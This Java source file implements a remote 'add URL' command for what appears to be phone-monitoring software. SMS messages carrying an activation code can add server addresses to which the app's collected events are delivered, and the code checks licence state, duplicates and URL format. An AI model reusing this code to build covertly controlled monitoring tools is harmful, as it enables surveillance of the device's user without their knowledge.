package com.vvt.remotecommandmanager.processor.urllist;

import java.util.List;

import com.vvt.appcontext.AppContext;
import com.vvt.datadeliverymanager.Customization;
import com.vvt.eventrepository.FxEventRepository;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseStatus;
import com.vvt.logger.FxLog;
import com.vvt.preference_manager.PreDefaultValues;
import com.vvt.remotecommandmanager.MessageManager;
import com.vvt.remotecommandmanager.ProcessingType;
import com.vvt.remotecommandmanager.RemoteCommandData;
import com.vvt.remotecommandmanager.RemoteCommandType;
import com.vvt.remotecommandmanager.exceptions.InvalidCommandFormatException;
import com.vvt.remotecommandmanager.exceptions.RemoteCommandException;
import com.vvt.remotecommandmanager.processor.ProcessingResult;
import com.vvt.remotecommandmanager.processor.RemoteCommandProcessor;
import com.vvt.remotecommandmanager.utils.RemoteCommandUtil;
import com.vvt.server_address_manager.ServerAddressManager;
import com.vvt.stringutil.FxStringUtils;

public class AddURLProcessor extends RemoteCommandProcessor {
	private static final String TAG = "AddURLProcessor";
	
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	private static final boolean LOGD = Customization.DEBUG;
	private static final boolean LOGW = Customization.WARNING;
	private static final boolean LOGE = Customization.ERROR;
	
	private String mRecipientNumber;
	private ProcessingResult mReplyMessage;
	private LicenseInfo mLicenseInfo;
	private ServerAddressManager mServerAddressManager;
	private StringBuilder mReplyMessageBuilder;
	
	public AddURLProcessor(AppContext appContext, FxEventRepository eventRepository,
			LicenseInfo licenseInfo, ServerAddressManager serverAddressManager) {
		super(appContext, eventRepository);
		
		mLicenseInfo = licenseInfo;
		mReplyMessage = new ProcessingResult();
		mServerAddressManager = serverAddressManager;
	}

	@Override
	public ProcessingType getProcessingType() {
		return ProcessingType.SYNC;
	}

	@Override
	protected void doProcessCommand(RemoteCommandData commandData)
			throws RemoteCommandException {
		if(LOGV) FxLog.v(TAG, "doProcessCommand # ENTER ...");
		mReplyMessageBuilder = new StringBuilder();
		
		validateRemoteCommandData(commandData);
		
		if(mLicenseInfo.getLicenseStatus() == LicenseStatus.DISABLED) {
			mReplyMessageBuilder.append(MessageManager.LICENSE_DISABLED_WARNING).append(System.getProperty("line.separator"));
		} else if (mLicenseInfo.getLicenseStatus() == LicenseStatus.EXPIRED) {
			mReplyMessageBuilder.append(MessageManager.LICENSE_EXPIRED_WARNING).append(System.getProperty("line.separator"));
		}
		
		if(commandData.isSmsReplyRequired()) {
			mRecipientNumber = commandData.getSenderNumber();
		}
		
		List<String> args = null;
		
		try	 {
			
			if(commandData.getRmtCommandType() == RemoteCommandType.SMS_COMMAND) {
				args = RemoteCommandUtil.removeActivationCodeFromArgs(commandData.getArguments());			
			}
			else {
				args = commandData.getArguments();
			}
			
			if(LOGD) FxLog.d(TAG, "doProcessCommand # args : " + args.toString());
			
			List<String> userUrls = mServerAddressManager.queryUserUrl();
			
			for (String u : userUrls) {
				if(LOGD) FxLog.d(TAG, "doProcessCommand # userUrl : " + u.toString());
			}
			
			if(userUrls.size() >= PreDefaultValues.MAX_URLS_ALLOWED) {
				mReplyMessage.setIsSuccess(false);
				mReplyMessageBuilder.append(MessageManager.getErrorMessage(MessageManager.ErrCmdUrlExceedListCapacity));
				mReplyMessage.setMessage(mReplyMessageBuilder.toString());
				return;
			}
			
			// Validate
			for(String newUrl: args) {
				if(userUrls.contains(newUrl)) {
					if(LOGV) FxLog.v(TAG, "doProcessCommand # Duplicate Url : "+newUrl);
					
					mReplyMessage.setIsSuccess(false);
					mReplyMessageBuilder.append(MessageManager.getErrorMessage(MessageManager.ErrCmdCannotAddDuplicateToURLList));
					mReplyMessage.setMessage(mReplyMessageBuilder.toString());
					return;
				}
				else {
					if(LOGW) FxLog.w(TAG, "doProcessCommand # not Duplicate Url : "+newUrl);
				}
	
				if(!FxStringUtils.isValidUrl(newUrl)) {
					if(LOGW) FxLog.w(TAG, "doProcessCommand # Invalid format Url : "+newUrl);
					mReplyMessage.setIsSuccess(false);
					mReplyMessageBuilder.append(MessageManager.getErrorMessage(MessageManager.ErrCmdInvalidURLToURLList));
					mReplyMessage.setMessage(mReplyMessageBuilder.toString());
					return;
				}
			}
		
			for(String sereverUrl: args) {
				if(LOGV) FxLog.v(TAG, "doProcessCommand # setServerUrl : " + sereverUrl);
				mServerAddressManager.setServerUrl(sereverUrl);
			}

			mReplyMessage.setIsSuccess(true);
			mReplyMessage.setMessage(MessageManager.ADD_URL_SUCCESS);
		}
		catch(Throwable t) {
			if(LOGE) FxLog.e(TAG, t.toString());
			
			mReplyMessage.setIsSuccess(false);
			mReplyMessage.setMessage(MessageManager.ADD_URL_ERROR);
		}
		
		if(LOGV) FxLog.v(TAG, "doProcessCommand # IsSuccess : " + mReplyMessage.isSuccess());
		if(LOGV) FxLog.v(TAG, "doProcessCommand # ReplyMessage : " + mReplyMessage.getMessage());
		if(LOGV) FxLog.v(TAG, "doProcessCommand # EXIT ...");
	}

	protected void validateRemoteCommandData(RemoteCommandData commandData) throws RemoteCommandException{
		
		if(commandData.getRmtCommandType() == RemoteCommandType.SMS_COMMAND) {
			if(commandData.getArguments().size() < 2) {
				throw new InvalidCommandFormatException();
			}
		
			//if invalid activation code it will throw exception.
			RemoteCommandUtil.validateActivationCode(commandData.getArguments().get(0), mLicenseInfo);
		}
	}

	@Override
	protected String getRecipientNumber() {
		return mRecipientNumber;
	}

	@Override
	protected ProcessingResult getReplyMessage() {
		return mReplyMessage;
	}

}
